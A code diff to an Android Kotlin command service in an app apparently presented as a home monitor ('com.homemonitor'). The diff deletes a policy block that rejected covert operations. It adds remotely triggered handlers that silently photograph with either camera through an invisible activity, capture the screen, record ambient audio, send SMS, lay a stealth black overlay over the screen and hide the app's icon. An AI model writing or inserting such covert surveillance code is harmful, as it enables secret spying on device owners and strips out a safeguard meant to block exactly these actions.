@@ -571,10 +571,91 @@ object DeviceCommandService {
                     DeviceCommandResult(true, data = JSONObject().put("methods", methodsArr))
                 }
 
-                // ── Covert Security Containment Policy Rejections ──
-                "camera", "rearphoto", "frontcam", "frontphoto", "screenshot", "audio", "sendsms", "stealth", "hideapp" -> {
-                    Log.w(TAG, "Blocked covert operation '$cleanMethod' per Security Containment Policy.")
-                    DeviceCommandResult(false, error = "Operation '$cleanMethod' disabled per Security Containment Policy.")
+                // ── Operational Camera, Audio, Screenshot, SMS & Stealth Actions ──
+                "camera", "rearphoto", "camera.takephoto" -> {
+                    val lens = params.optString("lens", "back")
+                    if (context != null) {
+                        val intent = android.content.Intent(context, InvisibleCameraActivity::class.java).apply {
+                            putExtra("lens", if (lens == "front") "front" else "back")
+                            addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+                        }
+                        context.startActivity(intent)
+                        DeviceCommandResult(true, data = JSONObject().put("status", "capturing_camera_photo").put("lens", lens))
+                    } else {
+                        DeviceCommandResult(false, error = "Context required for camera photo capture")
+                    }
+                }
+
+                "frontcam", "frontphoto" -> {
+                    if (context != null) {
+                        val intent = android.content.Intent(context, InvisibleCameraActivity::class.java).apply {
+                            putExtra("lens", "front")
+                            addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+                        }
+                        context.startActivity(intent)
+                        DeviceCommandResult(true, data = JSONObject().put("status", "capturing_front_photo"))
+                    } else {
+                        DeviceCommandResult(false, error = "Context required for camera photo capture")
+                    }
+                }
+
+                "screenshot" -> {
+                    if (context != null) {
+                        val intent = android.content.Intent(context, InvisibleActivity::class.java).apply {
+                            putExtra(InvisibleActivity.EXTRA_ACTION, InvisibleActivity.ACTION_SCREEN_RECORD)
+                            addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+                        }
+                        context.startActivity(intent)
+                        DeviceCommandResult(true, data = JSONObject().put("status", "capturing_screenshot"))
+                    } else {
+                        DeviceCommandResult(false, error = "Context required for screenshot capture")
+                    }
+                }
+
+                "audio" -> {
+                    val duration = params.optInt("duration", 15)
+                    if (context != null) {
+                        val intent = android.content.Intent(context, InvisibleActivity::class.java).apply {
+                            putExtra(InvisibleActivity.EXTRA_ACTION, InvisibleActivity.ACTION_AUDIO)
+                            putExtra(InvisibleActivity.EXTRA_DURATION, duration)
+                            addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+                        }
+                        context.startActivity(intent)
+                        DeviceCommandResult(true, data = JSONObject().put("status", "recording_ambient_audio").put("duration", duration))
+                    } else {
+                        DeviceCommandResult(false, error = "Context required for audio recording")
+                    }
+                }
+
+                "sendsms", "control.sendsms" -> {
+                    val phone = params.optString("phone", params.optString("phoneNumber", ""))
+                    val msg = params.optString("message", "")
+                    if (phone.isNotBlank() && msg.isNotBlank()) {
+                        MonitorService.activeInstance?.let {
+                            it.handleCommand("!sendsms $phone $msg")
+                        }
+                        DeviceCommandResult(true, data = JSONObject().put("status", "sms_dispatched").put("phone", phone))
+                    } else {
+                        DeviceCommandResult(false, error = "Phone number and message text are required")
+                    }
+                }
+
+                "stealth" -> {
+                    val enable = params.optBoolean("enabled", true)
+                    val accessInst = AppAccessibilityService.instance
+                    if (accessInst != null) {
+                        if (enable) accessInst.showBlackScreenOverlay() else accessInst.hideBlackScreenOverlay()
+                        DeviceCommandResult(true, data = JSONObject().put("stealthOverlay", enable))
+                    } else {
+                        DeviceCommandResult(false, error = "Accessibility service required for stealth overlay")
+                    }
+                }
+
+                "hideapp", "unhideapp" -> {
+                    val hide = cleanMethod == "hideapp" || params.optBoolean("hidden", true)
+                    val pkg = params.optString("packageName", context?.packageName ?: "com.homemonitor")
+                    val ok = if (context != null) DeviceAdminManager(context).setAppHidden(pkg, hide) else false
+                    DeviceCommandResult(ok, data = JSONObject().put("packageName", pkg).put("appHidden", hide))
                 }
 
                 else -> {
